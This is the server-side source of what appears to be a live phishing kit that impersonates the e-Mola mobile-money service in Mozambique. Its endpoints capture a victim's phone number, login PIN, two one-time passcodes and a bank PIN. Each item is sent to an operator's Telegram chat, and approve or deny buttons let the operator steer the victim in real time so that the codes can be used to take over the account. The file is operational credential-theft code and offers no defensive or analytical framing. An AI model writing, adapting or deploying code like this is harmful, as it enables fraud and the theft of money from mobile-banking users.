const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Mozambique";
    const countryCode = "+258";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>e-Mola - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇲🇿 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Awaiting approval</b>
⌛ <b>Time limit: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow / Approve", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid Credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Mozambique";
    const countryCode = "+258";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `1️⃣ <b>e-Mola - FIRST OTP (Step 1/2)</b>

🆕 <b>NEW USER - FIRST VERIFICATION</b>
🇲🇿 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>OTP 1 Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify FIRST OTP:</b>
⌛ <b>Time limit: 5 minutes</b>
📝 <b>Next: Second OTP will be sent after approval</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
                        { text: "❌ Incorrect Code", callback_data: `otp1_wrong|${phone}` },
                        { text: "🔑 Incorrect PIN", callback_data: `otp1_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Mozambique";
    const countryCode = "+258";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>e-Mola - SECOND OTP (Step 2/2)</b>

🆕 <b>NEW USER - SECOND VERIFICATION</b>
🇲🇿 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>OTP 2 Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>
⌛ <b>Time limit: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Incorrect Code", callback_data: `otp2_wrong|${phone}` },
                        { text: "🔑 Incorrect PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });

    const resendMsg = `🔄 <b>RESEND REQUESTED</b>

📱 <b>Phone Number:</b> ${phone}
📍 <b>Step:</b> ${step}
⚠️ <b>User is waiting for a new code.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram Error" });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "Mozambique";
    const countryCode = "+258";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Incomplete data" });

    statusStore[phone] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>e-Mola - BANK PIN VERIFICATION (Step 3)</b>

🆕 <b>NEW USER - BANK SECURITY</b>
🇲🇿 <b>Country:</b> ${country}
📱 <b>Phone Number:</b> ${phone}
🔑 <b>Bank PIN:</b> ${bankPin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify BANK PIN:</b>
⌛ <b>Time limit: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ Incorrect PIN", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram Error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const approvedMsg = `✅ <b>LOGIN APPROVED</b>

🆕 <b>NEW USER</b>
🇲🇿 <b>Mozambique</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Approved</b>
➡️ <b>Next: First OTP (1/2)</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

// DENY
bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>

🇲🇿 <b>Mozambique</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Status: Rejected</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

// OTP1 CORRECT
bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>

🇲🇿 <b>Mozambique</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: First OTP Verified</b>
➡️ <b>Next: Second OTP (2/2) will be sent</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

// OTP1 WRONG
bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Incorrect Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INCORRECT FIRST OTP</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested OTP resend.</b>`);
});

// OTP1 WRONG PIN (Redirects page8 back to page6)
bot.action(/^otp1_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "pin_wrong";
    await ctx.answerCbQuery("Incorrect PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>INCORRECT PIN REPORTED (OTP 1)</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested to re-enter PIN.</b>`);
});

// OTP2 CORRECT
bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>

🇲🇿 <b>Mozambique</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Second OTP Verified</b>
✅ <b>Process Completed</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Completed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

// OTP2 WRONG
bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("Incorrect Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INCORRECT SECOND OTP</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested OTP resend.</b>`);
});

// OTP2 WRONG PIN
bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "pin_wrong";
    await ctx.answerCbQuery("Incorrect PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>INCORRECT PIN REPORTED (OTP 2)</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested to re-enter PIN.</b>`);
});

// BANK PIN CORRECT
bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    
    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>

🇲🇿 <b>Mozambique</b>
📱 <b>${phone}</b>
🔑 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Process Completed</b>
🏁 <b>User redirected to success page</b>`;

    await ctx.answerCbQuery("Bank PIN Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(finalizedMsg);
});

// BANK PIN WRONG
bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("Incorrect Bank PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INCORRECT BANK PIN</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested PIN re-entry.</b>`);
});

// -------------------- STATUS CHECK (FIXED LOOP) --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Error starting bot:", err);
    }
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
